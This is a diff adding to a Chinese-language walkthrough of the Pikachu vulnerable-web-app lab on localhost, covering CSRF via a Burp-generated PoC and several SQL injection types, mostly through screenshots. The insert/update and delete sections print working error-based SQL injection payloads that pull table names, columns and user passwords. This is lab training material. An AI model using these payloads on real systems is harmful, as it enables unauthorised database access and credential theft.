@@ -86,4 +86,144 @@ http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=male&phonenum=U 
 
 ### CSRF(POST)
 
-本题使用allen，因为是POST，不能在url栏直接构造payload，我们需要构造一个恶意网页
+本题使用allen，因为是POST，不能在url栏直接构造payload，我们需要构造一个恶意网页，这里直接使用BurpSuite自带的工具。抓包，生成CSRF POC
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/EFBY~AL[96T}%]SLPF)YGKN.png?raw=ture">
+
+修改相关信息，生成HTML
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/L1[F{1ON4(V$S]~7%GEO6Z4.png?raw=true">
+
+进入HTML，点击提交，修改成功
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/_ZK3%$BUZ_T8YWDUPFZZ6QU.png?raw=true">
+
+## SQL-Injection
+
+### 数字型注入(post)
+
+直接抓包，发送到Repeater
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/5PP1$EF(BR}8F7QBFDQE[YQ.png?raw=true">
+
+判断字段数
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/RW0MVY``KZA04{$EN8D}E]1.png?raw=true">
+
+判断回显点
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/UUGHG)L~$HFS~F06TJB`~[O.png?raw=true">
+
+查看数据库和版本
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/Y0Q`6B[B53YJ9[)MQUZX%R7.png?raw=true">
+
+查询所有表
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/OJAPH@OKF_N%V6N[WRM((4C.png?raw=true">
+
+查询users下所有字段
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/3)G[X@~UR@51E0@PFAF}R$U.png?raw=true">
+
+查询字段内容
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/Y}C4~NZXVBY5O%``BRHA9HM.png?raw=true">
+
+### 字符型注入(get)
+
+判断注入点
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/QMYKI6KGR_(7NXBP0VPEOSJ.png?raw=true">
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/SAZ_[3JP(77}QYYTWY5@Q$6.png?raw=true">
+
+确定存在注入点，且单引号闭合，判断字段数
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/3Z)`EM%PGV(PM0@H_K2{[H3.png?raw=true">
+
+判断回显点
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/V}2]2K5~N_2~QG{CU]934XB.png?raw=true">
+
+下面步骤省略
+
+### 搜索型注入
+
+根据报错信息，数字后多了个百分号
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/[FZZ`{E2B0@{9}`W)TPEZH7.png?raw=true">
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/6{%)51O761)I`E4RGNMKCI1.png?raw=true">
+
+### xx型注入
+
+引号后多了个括号
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/T8)77@E2I_T`G}1G%LFWKM6.png?raw=true">
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/0CM%7~O40YM(KL3%YUWVX4V.png?raw=true">
+
+### insert/update注入
+
+进入注册页面，构建报错注入的payload。查询数据库
+
+```sql
+1' and extractvalue(1,concat(0x5c,(database()))) and '1'='1
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/OJNL6{ZNM0E50JU6G`%C}6Y.png?raw=true">
+
+查询表
+
+```sql
+1' and extractvalue(1,concat(0x5c,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1))) and '1'='1
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/A2E{THKIKFGC]XK)WR_%$[T.png?raw=true">
+
+查询users下字段
+
+```sql
+1' and extractvalue(1,concat(0x5c,(select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 1,1))) and '1'='1
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/`N0]WK}5ECSSWKXZR]1RL6B.png?raw=true">
+
+查询字段内容，这里因为长度限制，所以使用mid函数截取获取到的内容，每次十个字符长度
+
+```sql
+1' and extractvalue(1,concat(0x7e,mid((select password from pikachu.users limit 0,1),1,10))) and '1'='1
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/1N6E[P3(OOIC8USQKBK7YVI.png?raw=true">
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/C)4C~~LNFCOQ5O710S~[P}M.png?raw=true">
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/BV4E}8EW]W`M5%J4EOFNV$H.png?raw=true">
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/N{3AJ()KB@N}OB5A`N18K`O.png?raw=true">
+
+### delete注入
+
+有一个留言板，提交后可以删除
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/HCZ%FT8)RI4NV0AG56NLDEC.png?raw=true">
+
+当光标移动到删除上的时候，左下角出现请求
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/~VIZN~Q~A9[3`_79Q_IMI%4.png?raw=true">
+
+抓包，发现是GET传参，发送到Repeater构建payload，注意需要转换为url编码
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/@Z{(3EIOY0KKJD]_5T9]P`P.png?raw=true">
+
+查询数据库
+
+```sql
+1%20and%20extractvalue(1,concat(0x5c,(database())))
+```
+
+> <img src="https://github.com/Ki1z/Pikachu/blob/main/IMG/IAP@@PE2FM_Q56175~9KNX9.png?raw=true">
+
+以下省略
